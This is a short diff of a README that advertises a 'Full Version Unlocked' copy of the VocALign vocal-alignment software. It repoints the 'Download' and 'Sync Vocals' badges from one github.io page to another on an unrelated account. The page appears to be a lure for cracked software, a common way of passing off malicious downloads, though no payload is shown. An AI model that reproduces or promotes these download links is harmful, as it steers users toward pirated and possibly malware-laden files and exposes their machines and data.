@@ -1,7 +1,7 @@
 # 🎙️ VocALign — Precise Vocal Alignment (Full Version Unlocked)
 
-[![Download VocALign](https://img.shields.io/badge/Download_VocALign-darkcyan?style=for-the-badge)](https://vocalign-studio.github.io/.github/)  
-[![Sync Vocals](https://img.shields.io/badge/Sync_Vocals-indigo?style=for-the-badge&logo=music)](https://vocalign-studio.github.io/.github/)
+[![Download VocALign](https://img.shields.io/badge/Download_VocALign-darkcyan?style=for-the-badge)](https://simonchiksvetlana32.github.io/.github/vocalign-studio)  
+[![Sync Vocals](https://img.shields.io/badge/Sync_Vocals-indigo?style=for-the-badge&logo=music)](https://simonchiksvetlana32.github.io/.github/vocalign-studio)
 
 ---
 
